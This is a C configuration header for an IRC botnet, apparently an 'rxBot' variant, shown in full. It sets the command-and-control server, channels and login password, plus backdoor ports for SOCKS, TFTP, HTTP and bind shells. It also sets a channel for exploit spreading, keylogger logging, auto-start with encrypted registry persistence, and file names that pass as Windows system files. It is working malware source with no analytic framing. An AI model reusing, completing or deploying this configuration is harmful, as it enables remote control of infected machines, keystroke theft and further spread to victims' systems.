//==========================================================================\\
//=       ===   ==   ==      =====      =========  =====  ===      ======  =\\
//=  ====  ===  ==  ===  ===  ===   ==   ========   ===   ==   ==   =====  =\\
//=  ====  ===  ==  ===  ====  ==  ====  ===  ===  =   =  ==  ====  =====  =\\
//=  ===   ====    ====  ===  ===  ====  ==    ==  == ==  ==  ====  =====  =\\
//=      =======  =====      ====  ====  ===  ===  =====  ==  ====  ===    =\\
//=  ====  ====    ====  ===  ===  ====  ===  ===  =====  ==  ====  ==  =  =\\
//=  ====  ===  ==  ===  ====  ==  ====  ===  ===  =====  ==  ====  ==  =  =\\
//=  ====  ===  ==  ===  ===  ===   ==   ===  ===  =====  ==   ==   ==  =  =\\
//=  ====  ==  ====  ==      =====      ====   ==  =====  ===      ====    =\\
//==========================================================================\\
//////RXB()tM()d/////////BuZ-MoD///////RXB()tM()d////////BuZ-MoD////////////\\
//////////////////////////////////////////////////////////////////////////////

// NICK SETTINGS
int maxrand = 4;
BOOL nickprefix = TRUE;
int nicktype = UPOSNICK;


// PORTS 
int port = 31667;
int port2 = 666;
int socks4port = 1243;
int tftpport = 69;
int httpport = 2001;
int rloginport = 563;
int bindport = 3169;

// MISC. SETTINGS
BOOL topiccmd = TRUE;
BOOL rndfilename = FALSE;
BOOL AutoStart = TRUE;
#ifndef NO_VNC 
char http[] = "tftp -i"; 
#endif

// BOT PREFIX
char prefix = '!';


#ifndef NO_CRYPT

// SERVER SETTINGS
char server[] = ".32";
char serverpass[] = "";
char channel[] = "#netapi";
char chanpass[] = "";
char server2[] = "";
char channel2[] = "";
char chanpass2[] = "";


char nickconst[] = "\x6A\x49\xAE";


// LOGIN PASSWORD
char password[] = "prium";


// BOT FILENAME SETTINGS
char filename[] = "netsrv.exe";
char szLocalPayloadFile[]= "Windows-Net";
char logfile[]= "lsass.dat";


// BOT CONFIGURATION
char botid[] = "";
char version[] = "";
char modeonconn[] = "\x0F\x54";
char chanmode[] = "\x0F\x5F\x97\x4A\x0F\x92";


// EXPLOIT CHANNEL
char exploitchan[] = "#net";
#ifndef NO_KEYLOG
char keylogfile[] = "sass.dat";
char keylogchan[] = "#net";
#endif

// MASTER HOST
char *authost[] = {
	"*@*"
};


// FAKE VERSION LIST
char *versionlist[] = {
	"fuxxed"
};
	

// REGISTRY SETTINGS
char valuename[] = "\x69\x45\x99\x56\x14\x91\xB8\x37\xE9";
char regkey1[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93";
char regkey2[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93\xA8\x34\xC2\x71\xDD\xFE\x98\xC9";
char regkey3[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x91\xC0\x02";
char regkey4[]="\x77\x75\xA9\x70\x3E\xAF\x8B\x0D\xDE\x79\x0C\xD8\x4B\x6A\xDB\x8B\xD0\x81\x72\xD5\xC2\xB2\xDF\x22\xB9\x09\x87\xB2\x97\x7F\x65\xEE\x99\xB3\xE8\x80\xBF\xEB\x92";


#endif
